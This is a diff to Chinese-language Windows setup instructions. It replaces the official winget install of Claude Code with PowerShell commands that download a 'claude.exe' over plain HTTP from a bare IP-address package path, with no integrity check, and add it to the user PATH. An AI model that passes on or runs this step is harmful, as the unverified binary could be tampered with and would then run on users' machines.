@@ -7,7 +7,14 @@
 按 `Win` 键，输入 `powershell`，回车，执行：
 
 ```powershell
-winget install Anthropic.ClaudeCode
+New-Item -ItemType Directory -Force -Path $env:USERPROFILE\.local\bin
+Invoke-WebRequest -Uri "http://115.156.209.154:33000/Zxzz106/-/packages/generic/claude-code/2.1.169/files/1" -OutFile $env:USERPROFILE\.local\bin\claude.exe
+[Environment]::SetEnvironmentVariable("Path", "$env:USERPROFILE\.local\bin;" + [Environment]::GetEnvironmentVariable("Path", "User"), "User")
+```
+
+重新打开终端使 PATH 生效，然后执行：
+
+```powershell
 winget install Git.Git
 winget install Microsoft.VisualStudioCode
 winget install Python.Python.3.12
